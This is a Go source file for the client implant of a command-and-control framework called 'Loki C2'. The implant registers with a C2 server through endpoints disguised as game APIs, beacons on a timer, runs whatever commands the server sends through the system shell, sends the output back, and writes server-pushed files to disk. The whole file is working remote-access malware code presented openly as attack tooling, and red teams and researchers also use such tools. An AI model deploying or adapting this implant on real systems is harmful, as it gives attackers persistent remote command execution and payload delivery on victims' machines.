/*
Copyright 2018 Kris Howard

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

	http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

// Serve as a client to the Loki C2
package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"mime"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

var cuid string
var key string
var register = "/api/game/login"
var taskboard = "/api/game"
var apiRoot string
var beaconTime int
var cmdTimeOut int
var commandHint string
var commandArgZero string

// Setup main connection
func main() {
	// Setup input flags
	apiRootPtr := flag.String("c2", "http://localhost:6543", "Command & Control Server URL")
	beaconTimePtr := flag.Int("beacon", 5, "Beacon Interval")
	cmdTimeOutPtr := flag.Int("cmdtimeout", 10, "Timeout given to command executions")
	// Parse flags, grabbing default values if not found
	flag.Parse()
	// Set globals appropriately
	apiRoot = *apiRootPtr
	beaconTime = *beaconTimePtr
	cmdTimeOut = *cmdTimeOutPtr

	// Determine operating environment
	// TODO consider iterating through all `runtime.GOOS` options
	if _, err := os.Stat("/bin/sh"); err == nil {
		commandHint = "/bin/sh"
		commandArgZero = "-c"
	} else if runtime.GOOS == "windows" {
		commandHint = "cmd.exe"
		commandArgZero = "/C"
	}
	// Get keys
	var keys map[string]interface{}
	response, err := http.PostForm(apiRoot+register, url.Values{"ehlo": {commandHint}})

	if err != nil {
		fmt.Printf("The HTTP request failed with error %s\n", err)
	} else {
		data, _ := ioutil.ReadAll(response.Body)
		json.Unmarshal([]byte(data), &keys)
	}
	// Assign these to global so they can easily be accessed everywhere
	cuid = keys["cuid"].(string)
	key = keys["key"].(string)
	fmt.Println("cuid: " + cuid + " key: " + key)
	// Monitor for tasks
	taskLoop()
}

func taskLoop() {
	// no need for timing out, but this can be a different case
	// timeout := time.After(5 * time.Second)
	tick := time.Tick(time.Duration(beaconTime) * time.Second)

	for {
		select {
		case <-tick:
			task, ok := getTask()
			if ok {
				tuid := task["tuid"].(string)
				if val, ok := task["cmd"]; ok {
					request := val.(string)
					fmt.Println("Got Task:" + tuid)
					cmdOut := runCmd(10, request)
					fmt.Println("Executed command: " + request)
					sendResult(tuid, cmdOut)
					fmt.Println("Sent command results to C2")
				} else if val, ok := task["get"]; ok {
					path := val.(string)
					fmt.Println("Got request for: " + path)

				}
			}
		}
	}
}

// Gets a task from the server if available
// Returns unmarshalled JSON, and a success bool
func getTask() (map[string]interface{}, bool) {
	var client = &http.Client{
		Timeout: time.Second * time.Duration(cmdTimeOut),
	}
	data := strings.NewReader(url.Values{"cuid": {cuid}, "key": {key}}.Encode())
	r, _ := http.NewRequest(http.MethodPost, apiRoot+taskboard, data)
	// Close the resources when getTask() finishes
	response, err := client.Do(r)
	if err != nil {
		println("error encountered:" + err.Error())
		return nil, false
	}
	defer response.Body.Close()
	// Server gives us an `204 No Content`` if no tasks available
	if response.StatusCode == 204 {
		return nil, false
	} else if response.StatusCode == 200 {
		t := response.Header.Get("Content-type")
		if t == "application/json" {
			data, _ := ioutil.ReadAll(response.Body)
			var task map[string]interface{}
			json.Unmarshal([]byte(data), &task)
			return task, true
		}
		// file download
		disp := response.Header.Get("Content-Disposition")
		_, p, _ := mime.ParseMediaType(disp)
		name := p["filename"]
		temp := "~" + name
		out, _ := os.Create(temp)
		defer out.Close()
		io.Copy(out, response.Body)
		os.Rename(temp, name)
		println("Downloaded " + name)
	}
	return nil, false
}

func runCmd(timeout int, request string) string {
	// instantiate new command
	cmd := exec.Command(commandHint, commandArgZero, request)

	// get pipes
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return "cmd.StdoutPipe() error: " + err.Error()
	}

	// start process
	if err := cmd.Start(); err != nil {
		return "cmd.Start() error: " + err.Error()
	}

	// setup a buffer to capture standard output
	var buf bytes.Buffer

	// create a channel to capture any errors from wait
	done := make(chan error)
	go func() {
		if _, err := buf.ReadFrom(stdout); err != nil {
			panic("buf.Read(stdout) error: " + err.Error())
		}
		done <- cmd.Wait()
	}()

	// run the command, timing out after timeout while still getting results
	select {
	case <-time.After(time.Duration(timeout) * time.Second):
		if err := cmd.Process.Kill(); err != nil {
			return "Timeout Reached, Failed to Kill:\n" + err.Error()
		}
		<-done
		return "Timeout Reached:\n" + buf.String()
	case err := <-done:
		if err != nil {
			close(done)
			return "Error Occurred:\n" + err.Error()
		}
		return "Process Complete:\n" + buf.String()
	}
}

func sendResult(tuid string, result string) bool {
	var client = &http.Client{
		Timeout: time.Second * time.Duration(10),
	}
	data := strings.NewReader(url.Values{"cuid": {cuid}, "key": {key}, "tuid": {tuid}, "data": {result}}.Encode())
	r, _ := http.NewRequest(http.MethodPut, apiRoot+taskboard, data)
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	response, err := client.Do(r)
	if err != nil {
		println("error encountered when putting: " + err.Error())
	}
	defer response.Body.Close()
	if response.StatusCode == 200 {
		return true
	}
	return false
}
